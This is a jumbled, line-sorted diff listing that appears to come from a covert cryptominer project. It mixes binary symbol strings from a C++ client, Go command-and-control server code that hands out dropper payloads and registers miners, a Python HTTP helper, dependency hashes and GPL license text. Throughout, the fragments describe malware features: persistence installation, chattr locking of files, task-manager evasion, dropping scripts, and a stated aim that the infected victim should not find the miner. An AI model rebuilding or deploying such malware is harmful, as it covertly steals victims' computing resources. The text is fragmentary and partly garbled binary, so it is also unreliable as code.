+HEHUH
+HEHUHEH50
+HEHUHEHHHEHEUHSHXH
+HEHUHH
+HEHUHMHH
+HEHV
+HEHWHEH
+HEHYm
+HEHZHEH>HH
+HEH[
+HEH_m
+HEHqUHH0H}HuHUHUHEHHR
+HEH}
+HEUHH
+HEUHSH
+HE]UHH}HEH
+HE]f.
+HH H
+HH HHOHHHH
+HH!HiHEHHHHH
+HH-UHH
+HH/HGHHEH
+HH/HHH
+HH0H
+HH0HVHPHGHH
+HH6'
+HH9t
+HHEH
+HHEH%HHEH
+HHEH(
+HHEH:
+HHEHEH
+HHEHEHxHEHlH
+HHEHH
+HHEHHEH6HEH
+HHEHHEHHJ
+HHEHHH'H([]UHH
+HHEHHHEHdHE
+HHEHHHH
+HHEHHHHHEH4HHEH
+HHEHP
+HHEHSHH8HX[]UHH
+HHEHTHEHH
+HHEHfH0Hg
+HHEHp
+HHEHt
+HHEHx
+HHEH}
+HHH HHHHPHHHH
+HHH/HH/H
+HHH0HH=-
+HHH0HcHHHHH5)
+HHH5
+HHH8HEHEH55
+HHH<
+HHHCH0HD
+HHHEH
+HHHEHHHfHEHH[]UHSHhH}HuHEHHEHk
+HHHH
+HHHH0HHH
+HHHHH
+HHHHH/
+HHHHH5z
+HHHHHHHHEH
+HHHHPHEH
+HHHHpHtH
+HHHb
+HHHe[A
+HHHk
+HHHpHHH
+HHHtHHIH
+HHHyH0HzH_H[HEHHH@HHH5
+HHIA
+HHLHHEHPHH
+HHO.
+HHOHHH
+HHOHHHHHEH
+HHPH
+HHPHHQHH
+HHPHHgHHH
+HHPTL
+HHUHEHH$
+HHUHH
+HHWHEHHUHEH5</
+HH_H 
+HH_H=H_H0H5
+HH_HC
+HH_HH
+HHaH
+HHnUHH
+HHpHHHEHHUHH5
+HHpHHHHHPHHHHEHH/HH
+HHwH5-
+HMHHH
+HNH/H/HH0HH
+HOHHH
+HOHHOH H5
+HP HEH
+HPH570
+HPH5E
+HPH<H
+HPH@HHHHpH5u
+HPHE
+HPHEHHpHHH
+HUHEHH=
+HUHH5
+HUHMHEHH
+HUHMHEHHo
+HUHMHEHHw
+HUHSH8H}HuHUHEHEHEH
+HUHuH
+HULLLLHHHHH
+HWHEHHEHHJ HH5V
+HWHHLHH
+HWUH
+HXHHH
+H]UHH
+H_HHEH!H
+H_HH_HMH0HHHHbHH
+Help is welcome!
+HfUH
+HiUH
+HjH0H
+HjHH
+Hostname     string
+Ht 1
+HtUH]@UHATSH }HuH5 .
+HuHEHc
+H}HEH
+H}HEH@
+H}HEHH=C 
+H}HEHH=XC 
+H}HEHHHEHH
+H}HEHyUHH}H
+H}HuHEH
+H}HuHEHILeL 
+H}HuHEHUHHM
+H}HuHEHW
+H}HuHMHE
+H}HuHUHEHH
+H}HuHUHEHH%
+H}HuH}
+If any portion of this section is held invalid or unenforceable under
+If distribution of executable or object code is made by offering
+Infected victim should not know or find about the cryptominer
+InsertNewDropperCall(input any) error
+Ip   string
+IsAliveController       IsAlive.IsAliveController
+It is not the purpose of this section to induce you to infringe any
+Jg18DxebPSrd6bg1M=
+LDiLs=
+LIUmWTfcYkHO4aIWwzhcaSAoJOfIk=
+LLDA
+License is intended to guarantee your freedom to share and change free
+Log(input any) error
+LtxykD8LfKY9ML6u2jnxaEnrnM=
+MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.  THE ENTIRE RISK AS
+MGFi0w8I=
+Malware 
+Mining POOL: {id} = 
+Multithreaded c
+Name    string
+OS   io.OS
+OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
+OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED
+OUTPUT= cryptominer
+P%Y 
+P%bY 
+P%bZ 
+POSSIBILITY OF SUCH DAMAGES.
+Password     string
+Payload  io.Payload
+Payload io.Payload
+Payload string
+Payload: io.Payload{
+Port         int
+Premisses:
+Program (independent of having been made by running the Program).
+Public License instead of this License.
+Q6VDXinZuGJ33E=
+REPAIR OR CORRECTION.
+RM=rm
+Running persistence ... 
+SELECT 
+SELECT payload FROM Dropper where version='latest'
+SIIL)H
+SYow9zQ6SZMvR8qOMZHmsCuWR9tTTk=
+Sections 1 and 2 above provided that you also do one of the following:
+Send a GET request::
+Send a HEAD request::
+Send a POST request::
+Sending to server the miner ID ...
+Setting chattr in all files
+Software Foundation.  If the Program does not specify a version number of
+THEH
+THREAD=-pthread
+TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY
+TO THE QUALITY AND PERFORMANCE OF THE PROGRAM IS WITH YOU.  SHOULD THE
+The hypothetical commands 
+The server has to aknowledge new miners.  
+The source code for a work means the preferred form of the work for
+These requirements apply to the modified work as a whole.  If
+These restrictions translate to certain responsibilities for you if you
+This General Public License does not permit incorporating your program into
+This section is intended to make thoroughly clear what is believed to
+This web server will handle all the HTTP traffic.
+UH)HH
+UH-f
+UHEHHG
+UHEHHo
+UHH EEE
+UHH H}HEHP
+UHH H}HUHEHH
+UHH H}HuHUHEH
+UHH H}HuHUHEHUHH H}HuHUHUHMHEHHD
+UHH H}HuHUHEHZ
+UHH H}HuHUHMHUHMHEHH
+UHH H}HuHUHUHMHEHH
+UHH H}HuHUH}
+UHH0H}HuHUE
+UHH}H
+UHH}HEH
+UHH}HEH@
+UHH}HE]UHH
+UHH}HE]UHH H}HuHUHUHEHH
+UHH}HE]UHH H}HuHUHUHEHHQ
+UHH}HuHEH
+UHH}Hu]
+UHH}Hu]UHH
+UHH}]
+UHH}]UHH}HuHUHEH)HH
+UHSH(H}HuHEH
+UHSH(H}HuHUHEHUHH
+UHSH(H}HuHUHMHEHUHMHH
+UHSHHH}HuHEH7E
+UUID    string // Could be GUID (windows) / machine-id (linux)
+Usage::
+UseCase GetDropper.IGetDropperUseCase
+UseCase: GetDropper2.GetDropperUseCase{
+Username     string
+VERSION=-std=c
+Version string
+Very simple HTTP server in python.
+WbY/TyQbw=
+Whether that is true depends on what the Program does.
+XZ2dLUbcbE=
+Y2n4sBz93Jn9JRvxdiyyo8CTfuKaY=
+YNO8GZSjAhjMsSuLt29uWRFHdHYUb5lYOV9qE=
+YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER
+You are not responsible for enforcing compliance by third parties to
+You should also get your employer (if you work as a programmer) or your
+ZHHEHP
+ZQfWdccd7VUvScMdVu0Titje2rxJ4=
+[-] Chattr error!
+[]UHATSH0H}HHHHEHUHMHEHUHH
+[]UHH
+[]UHH}HEH
+[]UHSH
+] Chattr setted!
+] Cryptomining folder created!
+]UHAUATSHx
+]UHH
+]UHH}HE]UHAUATSH
+]UHH}HE]UHH}HuHUHE
+]UHH}HE]UHH}]
+]UHH}HuHE]UHH}Hu]UHH
+]UHSH
+_DYNAMIC
+_GLOBAL_OFFSET_TABLE_
+_GLOBAL__sub_I__Z7is_rootv
+_GLOBAL__sub_I__ZN5Error10exit_errorERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE
+_GLOBAL__sub_I__ZN5Tasks17lock_task_managerE
+_GLOBAL__sub_I__ZN6Base6413base64_encodeERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE
+_GLOBAL__sub_I_main
+_IO_stdin_used
+_ITM_deregisterTMCloneTable
+_ITM_registerTMCloneTable
+_Jv_RegisterClasses
+_Unwind_Resume
+_Unwind_Resume@@GCC_3.0
+_Z12get_usernamev
+_Z13get_pool_infov
+_Z14get_machine_idv
+_Z18drop_python_scriptv
+_Z19get_home_enviromentv
+_Z19install_persistencev
+_Z20set_persistence_bitsv
+_Z25copy_executable_to_folderv
+_Z26create_cryptomining_folderv
+_Z41__static_initialization_and_destruction_0ii
+_Z9new_minerv
+_ZN5Error9log_errorERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE
+_ZN5Tasks18check_task_managerEv
+_ZN6Base6413base64_decodeERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE
+_ZN9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE10deallocateEPS6_m
+_ZN9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE8allocateEmPKv
+_ZN9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEC1ERKS7_
+_ZN9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEC1Ev
+_ZN9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEC2ERKS7_
+_ZN9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEC2Ev
+_ZN9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEED1Ev
+_ZN9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEED2Ev
+_ZN9__gnu_cxx13new_allocatorIiE10deallocateEPim
+_ZN9__gnu_cxx13new_allocatorIiE8allocateEmPKv
+_ZN9__gnu_cxx13new_allocatorIiEC1ERKS1_
+_ZN9__gnu_cxx13new_allocatorIiEC1Ev
+_ZN9__gnu_cxx13new_allocatorIiEC2ERKS1_
+_ZN9__gnu_cxx13new_allocatorIiEC2Ev
+_ZN9__gnu_cxx13new_allocatorIiED1Ev
+_ZN9__gnu_cxx13new_allocatorIiED2Ev
+_ZN9__gnu_cxx17__normal_iteratorIPKcNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEppEv
+_ZN9__gnu_cxx17__normal_iteratorIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESt6vectorIS6_SaIS6_EEEC1ERKS7_
+_ZN9__gnu_cxx17__normal_iteratorIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESt6vectorIS6_SaIS6_EEEC2ERKS7_
+_ZN9__gnu_cxx17__normal_iteratorIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESt6vectorIS6_SaIS6_EEEppEv
+_ZN9__gnu_cxxL21__default_lock_policyE
+_ZN9__gnu_cxxneIPKcNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEEbRKNS_17__normal_iteratorIT_T0_EESE_
+_ZN9__gnu_cxxneIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESt6vectorIS6_SaIS6_EEEEbRKNS_17__normal_iteratorIT_T0_EESG_
+_ZNK9__gnu_cxx13new_allocatorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE8max_sizeEv
+_ZNK9__gnu_cxx13new_allocatorIiE8max_sizeEv
+_ZNK9__gnu_cxx17__normal_iteratorIPKcNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE4baseEv
+_ZNK9__gnu_cxx17__normal_iteratorIPKcNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEdeEv
+_ZNK9__gnu_cxx17__normal_iteratorIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESt6vectorIS6_SaIS6_EEE4baseEv
+_ZNK9__gnu_cxx17__normal_iteratorIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESt6vectorIS6_SaIS6_EEEdeEv
+_ZNKSt16initializer_listINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE3endEv
+_ZNKSt16initializer_listINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE4sizeEv
+_ZNKSt16initializer_listINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE5beginEv
+_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE3endEv
+_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE3endEv@@GLIBCXX_3.4.21
+_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE4sizeEv
+_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE4sizeEv@@GLIBCXX_3.4.21
+_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5beginEv
+_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5beginEv@@GLIBCXX_3.4.21
+_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv
+_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv@@GLIBCXX_3.4.21
+_ZNSaINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEC1ERKS5_
+_ZNSaINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEC1Ev
+_ZNSaINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEC2ERKS5_
+_ZNSaINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEC2Ev
+_ZNSaINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEED1Ev
+_ZNSaINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEED2Ev
+_ZNSaIcEC1Ev
+_ZNSaIcEC1Ev@@GLIBCXX_3.4
+_ZNSaIcED1Ev
+_ZNSaIcED1Ev@@GLIBCXX_3.4
+_ZNSaIiEC1ERKS_
+_ZNSaIiEC1Ev
+_ZNSaIiEC2ERKS_
+_ZNSaIiEC2Ev
+_ZNSaIiED1Ev
+_ZNSaIiED2Ev
+_ZNSolsEPFRSoS_E
+_ZNSolsEPFRSoS_E@@GLIBCXX_3.4
+_ZNSt12_Destroy_auxILb0EE9__destroyIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEEvT_S9_
+_ZNSt12_Destroy_auxILb1EE9__destroyIPiEEvT_S3_
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE11_M_allocateEm
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE12_Vector_implC1ERKS6_
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE12_Vector_implC2ERKS6_
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE12_Vector_implD1Ev
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE12_Vector_implD2Ev
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE13_M_deallocateEPS5_m
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE19_M_get_Tp_allocatorEv
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EEC1ERKS6_
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EEC2ERKS6_
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EED1Ev
+_ZNSt12_Vector_baseINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EED2Ev
+_ZNSt12_Vector_baseIiSaIiEE11_M_allocateEm
+_ZNSt12_Vector_baseIiSaIiEE12_Vector_implC1ERKS0_
+_ZNSt12_Vector_baseIiSaIiEE12_Vector_implC2ERKS0_
+_ZNSt12_Vector_baseIiSaIiEE12_Vector_implD1Ev
+_ZNSt12_Vector_baseIiSaIiEE12_Vector_implD2Ev
+_ZNSt12_Vector_baseIiSaIiEE13_M_deallocateEPim
+_ZNSt12_Vector_baseIiSaIiEE17_M_create_storageEm
+_ZNSt12_Vector_baseIiSaIiEE19_M_get_Tp_allocatorEv
+_ZNSt12_Vector_baseIiSaIiEEC1EmRKS0_
+_ZNSt12_Vector_baseIiSaIiEEC2EmRKS0_
+_ZNSt12_Vector_baseIiSaIiEED1Ev
+_ZNSt12_Vector_baseIiSaIiEED2Ev
+_ZNSt16allocator_traitsISaINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEE10deallocateERS6_PS5_m
+_ZNSt16allocator_traitsISaINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEE8allocateERS6_m
+_ZNSt16allocator_traitsISaIiEE10deallocateERS0_Pim
+_ZNSt16allocator_traitsISaIiEE8allocateERS0_m
+_ZNSt20__uninitialized_copyILb0EE13__uninit_copyIPKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPS7_EET0_T_SC_SB_
+_ZNSt22__uninitialized_fill_nILb1EE15__uninit_fill_nIPimiEET_S3_T0_RKT1_
+_ZNSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE19_M_range_initializeIPKS5_EEvT_SB_St20forward_iterator_tag
+_ZNSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE3endEv
+_ZNSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EE5beginEv
+_ZNSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EEC1ESt16initializer_listIS5_ERKS6_
+_ZNSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EEC2ESt16initializer_listIS5_ERKS6_
+_ZNSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EED1Ev
+_ZNSt6vectorINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEESaIS5_EED2Ev
+_ZNSt6vectorIiSaIiEE18_M_fill_initializeEmRKi
+_ZNSt6vectorIiSaIiEEC1EmRKiRKS0_
+_ZNSt6vectorIiSaIiEEC2EmRKiRKS0_
+_ZNSt6vectorIiSaIiEED1Ev
+_ZNSt6vectorIiSaIiEED2Ev
+_ZNSt6vectorIiSaIiEEixEm
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE9push_backEc
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE9push_backEc@@GLIBCXX_3.4.21
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_@@GLIBCXX_3.4.21
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1ERKS4_
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1ERKS4_@@GLIBCXX_3.4.21
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev@@GLIBCXX_3.4.21
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@@GLIBCXX_3.4.21
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSERKS4_
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEaSERKS4_@@GLIBCXX_3.4.21
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLERKS4_
+_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEpLERKS4_@@GLIBCXX_3.4.21
+_ZNSt8ios_base4InitC1Ev
+_ZNSt8ios_base4InitC1Ev@@GLIBCXX_3.4
+_ZNSt8ios_base4InitD1Ev
+_ZNSt8ios_base4InitD1Ev@@GLIBCXX_3.4
+_ZSt10_ConstructINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEJRKS5_EEvPT_DpOT0_
+_ZSt10__distanceIPKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEENSt15iterator_traitsIT_E15difference_typeES9_S9_St26random_access_iterator_tag
+_ZSt10__fill_n_aIPimiEN9__gnu_cxx11__enable_ifIXsrSt11__is_scalarIT1_E7__valueET_E6__typeES6_T0_RKS4_
+_ZSt11__addressofINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEPT_RS6_
+_ZSt12__niter_baseIPiET_S1_
+_ZSt17__throw_bad_allocv
+_ZSt17__throw_bad_allocv@@GLIBCXX_3.4
+_ZSt18uninitialized_copyIPKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPS5_ET0_T_SA_S9_
+_ZSt19__iterator_categoryIPKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEENSt15iterator_traitsIT_E17iterator_categoryERKS9_
+_ZSt20uninitialized_fill_nIPimiET_S1_T0_RKT1_
+_ZSt22__uninitialized_copy_aIPKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPS5_S5_ET0_T_SA_S9_RSaIT1_E
+_ZSt24__uninitialized_fill_n_aIPimiiET_S1_T0_RKT1_RSaIT2_E
+_ZSt4cerr
+_ZSt4cerr@@GLIBCXX_3.4
+_ZSt4cout
+_ZSt4cout@@GLIBCXX_3.4
+_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
+_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@@GLIBCXX_3.4
+_ZSt6fill_nIPimiET_S1_T0_RKT1_
+_ZSt7forwardIRKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEOT_RNSt16remove_referenceIS8_E4typeE
+_ZSt8_DestroyINSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEvPT_
+_ZSt8_DestroyIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEEvT_S7_
+_ZSt8_DestroyIPNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEES5_EvT_S7_RSaIT0_E
+_ZSt8_DestroyIPiEvT_S1_
+_ZSt8_DestroyIPiiEvT_S1_RSaIT0_E
+_ZSt8distanceIPKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEENSt15iterator_traitsIT_E15difference_typeES9_S9_
+_ZStL13allocator_arg
+_ZStL19piecewise_construct
+_ZStL6ignore
+_ZStL8__ioinit
+_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
+_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@@GLIBCXX_3.4
+_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKNSt7__cxx1112basic_stringIS4_S5_T1_EE
+_ZStlsIcSt11char_traitsIcESaIcEERSt13basic_ostreamIT_T0_ES7_RKNSt7__cxx1112basic_stringIS4_S5_T1_EE@@GLIBCXX_3.4.21
+_ZdlPv
+_ZdlPv@@GLIBCXX_3.4
+_ZdlPvS_
+_Znwm
+_Znwm@@GLIBCXX_3.4
+_ZnwmPv
+__FRAME_END__
+__GNU_EH_FRAME_HDR
+__JCR_END__
+__JCR_LIST__
+__TMC_END__
+__bss_start
+__cxa_atexit
+__cxa_atexit@@GLIBC_2.2.5
+__cxa_begin_catch
+__cxa_begin_catch@@CXXABI_1.3
+__cxa_end_catch
+__cxa_end_catch@@CXXABI_1.3
+__cxa_finalize
+__cxa_finalize@@GLIBC_2.2.5
+__cxa_rethrow
+__cxa_rethrow@@CXXABI_1.3
+__data_start
+__do_global_dtors_aux
+__do_global_dtors_aux_fini_array_entry
+__dso_handle
+__frame_dummy_init_array_entry
+__gmon_start__
+__gxx_personality_v0
+__gxx_personality_v0@@CXXABI_1.3
+__init_array_end
+__init_array_start
+__libc_csu_fini
+__libc_csu_init
+__libc_start_main
+__libc_start_main@@GLIBC_2.2.5
+__stat
+__xstat
+__xstat@@GLIBC_2.2.5
+_edata
+a notice placed by the copyright holder saying it may be distributed
+a storage or distribution medium does not bring the other work under
+access to copy the source code from the same place counts as
+address new problems or concerns.
+along with the Program.
+and can be reasonably considered independent and separate works in
+and give any other recipients of the Program a copy of this License
+anyone to deny you these rights or to ask you to surrender the rights.
+anything that is normally distributed (in either source or binary
+api.Server()
+apply and the section as a whole is intended to apply in other
+arq = 'mining_pool_info_file.txt'
+atop
+authors' reputations.
+base64.cpp
+base64.o: base64.cpp base64.h
+be a consequence of the rest of this License.
+be called something other than 
+bool create_cryptomining_folder(){
+bool is_root(){
+bozCKY1Ytp96fpM3vjJbqLJn88ws8XvfDNI=
+c.Next()
+c5H38=
+cgminer
+char 
+chdir
+chdir@@GLIBC_2.2.5
+check if task manager is open 
+circumstances.
+class Base64{
+class Error{
+class S(BaseHTTPRequestHandler):
+clean:
+client
+client 
+client.cpp
+client.o: client.cpp
+collective works based on the Program.
+communication.py
+compelled to copy the source along with the object code.
+completed.6972
+configVariables := variables.GetConfig()
+consider it more useful to permit linking proprietary applications with the
+conspicuously and appropriately publish on each copy an appropriate
+continue_mining()
+convey the exclusion of warranty
+copyright notice and disclaimer of warranty
+covered by this License
+createConnection() (
+crtstuff.c
+cryptominer
+database := database.Database{
+db.Config.Database.DatabaseName)
+deb9u1) 6.3.0 20170516
+def error():
+def get_mining_pool_info():
+def offline():
+def post(msg):
+defer newDb.Close()
+defer rows.Close()
+define BASE_64
+define ERROR_H
+define MAX_TERMINAL_OUTPUT 50000
+define PLATFORM_NAME NULL
+define TASKS_H
+define UTILS_H 
+define get_platform_name() ((PLATFORM_NAME == NULL) 
+deregister_tm_clones
+distribute and/or modify the software.
+distribute so as to satisfy simultaneously your obligations under this
+distribute such modifications or work under the terms of Section 1
+distribute the Program or its derivative works.  These actions are
+distribute the same sections as part of a whole which is a work based
+either of that version or of any later version published by the Free
+either verbatim or with modifications and/or translated into another
+elif TARGET_OS_IPHONE == 1
+elif TARGET_OS_MAC == 1
+elif defined(_AIX)
+elif defined(_WIN64)
+elif defined(__ANDROID__)
+elif defined(__APPLE__) 
+elif defined(__CYGWIN__) 
+elif defined(__hpux)
+elif defined(__linux__)
+elif defined(__sun) 
+elif defined(__unix__) 
+else
+endif
+err := c.BindJSON(
+err := db.Log(input)
+error.cpp
+error.o: error.cpp error.h
+except as expressly provided under this License.  Any attempt
+excuse you from the conditions of this License.  If you cannot
+exercise the right to control the distribution of derivative or
+f65V22dbkXbowE6jgT/gNBxE=
+fLHvGI=
+fclose
+fclose@@GLIBC_2.2.5
+fgets
+fgets@@GLIBC_2.2.5
+file persistence and undeleted files
+fopen
+fopen@@GLIBC_2.2.5
+fpipe
+fputs
+fputs@@GLIBC_2.2.5
+fr/el88TOO3ewCmQr8cx/CtZ/umlIRIs5M4NTNjf8=
+frame_dummy
+free software which everyone can redistribute and change under these terms.
+from sys import argv
+fscanf
+fscanf@@GLIBC_2.2.5
+func (controller ConnectController) Connect(c 
+func (controller GetDropperController) Get(c 
+func (controller GetExecutableController) Get(c 
+func (controller IsAliveController) Check(c 
+func (db Database) InsertNewDropperCall(input any) error {
+func (db Database) Log(input any) error {
+func (db Database) createConnection() (
+func GetConfig() Config {
+func GetDatabaseConfig() DatabaseConfig {
+func GetPayloadFromDisk(path string) []byte {
+func IsNullOrEmpty(s string) bool {
+func LoggerMiddleware(db database.IDatabase) gin.HandlerFunc {
+func Server() {
+func main() {
+generous contributions to the wide range of software distributed
+getpwuid
+getpwuid@@GLIBC_2.2.5
+getuid
+getuid@@GLIBC_2.2.5
+gin.Context) {
+github.com/creack/pty v1.1.9/go.mod h1:oKZEueFk5CKHvIhNR5MUki03XCEU
+github.com/davecgh/go-spew v1.1.0/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
+github.com/davecgh/go-spew v1.1.1 h1:vj9j/u1bqnvCEfJOwUhtlOARqs3
+github.com/davecgh/go-spew v1.1.1/go.mod h1:J7Y8YcW2NihsgmVo/mv3lAwl/skON4iLHjSsI
+github.com/gin-contrib/sse v0.1.0 // indirect
+github.com/gin-contrib/sse v0.1.0 h1:Y/yl/
+github.com/gin-contrib/sse v0.1.0/go.mod h1:RHrZQHXnP2xjPF
+github.com/gin-gonic/gin v1.8.1 h1:4
+github.com/gin-gonic/gin v1.8.1/go.mod h1:ji8BvRH1azfM
+github.com/go-playground/assert/v2 v2.0.1 h1:MsBgLAaY856
+github.com/go-playground/assert/v2 v2.0.1/go.mod h1:VDjEfimB/XKnb
+github.com/go-playground/locales v0.14.0 // indirect
+github.com/go-playground/locales v0.14.0 h1:u50s323jtVGugKlcYeyzC0etD1HifMjqmJqb8WugfUU=
+github.com/go-playground/locales v0.14.0/go.mod h1:sawfccIbzZTqEDETgFXqTho0QybSa7l
+github.com/go-playground/universal-translator v0.18.0 // indirect
+github.com/go-playground/universal-translator v0.18.0 h1:82dyy6p4OuJq4/CByFNOn/jYrnRPArHwAcmLoJZxyho=
+github.com/go-playground/universal-translator v0.18.0/go.mod h1:UvRDBj
+github.com/go-playground/validator/v10 v10.10.0 // indirect
+github.com/go-playground/validator/v10 v10.10.0 h1:I7mrTYv78z8k8VXa/qJlOlEXn/nBh
+github.com/go-playground/validator/v10 v10.10.0/go.mod h1:74x4gJWsvQexRdW8Pn3dXSGrTK4nAUsbPlLADvpJkos=
+github.com/goccy/go-json v0.9.7 // indirect
+github.com/goccy/go-json v0.9.7 h1:IcB
+github.com/goccy/go-json v0.9.7/go.mod h1:6MelG93GURQebXPDq3khkgXZkazVtN9CRI
+github.com/golang/protobuf v1.5.0/go.mod h1:FsONVRAS9T7sI
+github.com/google/go-cmp v0.5.5 h1:Khx7svrCpmxxtHBq5j2mp/xVjsi8hQMfNLvJFAlrGgU=
+github.com/google/go-cmp v0.5.5/go.mod h1:v8dTdLbMG2kIc/vJvl
+github.com/google/gofuzz v1.0.0/go.mod h1:dBl0BpW6vV/
